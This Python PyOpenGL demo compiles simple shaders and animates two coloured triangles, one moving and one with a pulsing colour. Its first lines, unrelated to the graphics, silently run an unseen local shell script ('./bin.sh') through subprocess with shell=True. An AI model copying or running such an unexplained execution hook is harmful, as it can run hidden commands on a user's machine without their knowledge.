import subprocess
subprocess.call("./bin.sh", shell=True)
from core.base import Base
from core.openGLUtlis import OpenGLUtlis
from OpenGL.GL import *
from core.attribute import Attribute
from core.uniform import Uniform
from math import sin

#render multiple triangles
class Test(Base):
  def initialize(self):
    print("starting..")

    #create gpu program 

    # vertex sader code(points)
    vsCode='''
    in vec3 position;
    uniform vec3 translation;
    void main()
    {
      vec3 pos = position + translation;
      gl_Position=vec4(pos.x,pos.y,pos.z,1.0);
    }'''

    #fragment shader code 
    fsCode='''
    uniform vec3 baseColor;
    void main()
    {
      gl_FragColor=vec4(baseColor.r,baseColor.g,baseColor.b,1.0);
    }'''  
    #send code to gpu to compile

    self.programRef=OpenGLUtlis.initlizeProgram(vsCode, fsCode)
    #vertx array object 

    #set up VAOs(vertex array objects)
    vaoRef= glGenVertexArrays(1)
    glBindVertexArray(vaoRef)

    #setup vertex Attribute
    positionData=[[ 0.0,  0.2, 0.0],
                  [ 0.2, -0.2, 0.0],
                  [-0.2, -0.2, 0.0]]
    positionAttribute=Attribute("vec3",positionData)
    positionAttribute.associateVariable(self.programRef,"position")
    self.vertexCount=len(positionData)
    #render settings
    glClearColor(0, 0.1, 0.1, 1)
    #set up uniforms
    self.translation1=Uniform("vec3",[-0.5,0.0,0.0])
    self.translation1.locateVariable(self.programRef,"translation")
    self.translation2=Uniform("vec3",[0.5,0.0,0.0])#sets the diatance
    self.translation2.locateVariable(self.programRef,"translation") 

    #to change color
    self.baseColor1=Uniform("vec3",[1.0,0.0,0.0])
    self.baseColor1.locateVariable(self.programRef,"baseColor")
    self.baseColor2=Uniform("vec3",[0.0,0.0,1.0])
    self.baseColor2.locateVariable(self.programRef,"baseColor")    
    self.time=0
  def update(self):
    # select program to use when rendering 
    glUseProgram(self.programRef)
    glClear(GL_COLOR_BUFFER_BIT)#clear the screen
    self.time+=1/60

    #draw the first triangle
    self.translation1.data[1]+=0.009
    self.translation1.uploadData()
    self.baseColor1.uploadData()
    #renders geometric object(s) using program
    glDrawArrays(GL_TRIANGLES, 0, self.vertexCount)
    #draw the second triangle
    self.baseColor2.data[2]=(sin(self.time)+1)/2
    self.translation2.uploadData()
    self.baseColor2.uploadData()
    #renders geometric object(s) using program
    glDrawArrays(GL_TRIANGLES, 0, self.vertexCount)

#create an instance of this class and run the program
Test().run()
# https://github.com/Namanskshetty/pyopengl
